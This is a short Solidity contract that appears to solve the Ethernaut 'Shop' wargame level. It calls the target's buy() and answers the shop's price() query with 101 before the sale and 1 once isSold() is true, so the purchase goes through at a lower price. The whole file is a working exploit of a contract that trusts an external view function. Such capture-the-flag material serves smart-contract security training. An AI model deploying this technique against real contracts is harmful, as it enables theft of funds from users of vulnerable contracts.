// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

interface Shop {
    function isSold() external view returns(bool);
}
contract Ethernaut {

    address public instance;
    constructor(address _instance) public {
        instance = _instance;
    }

    function answer() external {
        (bool success, bytes memory result) = address(instance).call(abi.encodeWithSignature("buy()"));
        require(success);
    }

    function price() external view returns (uint){
        if(!Shop(instance).isSold()){
            return 101;
        }else{
            return 1;
        }
    }


}
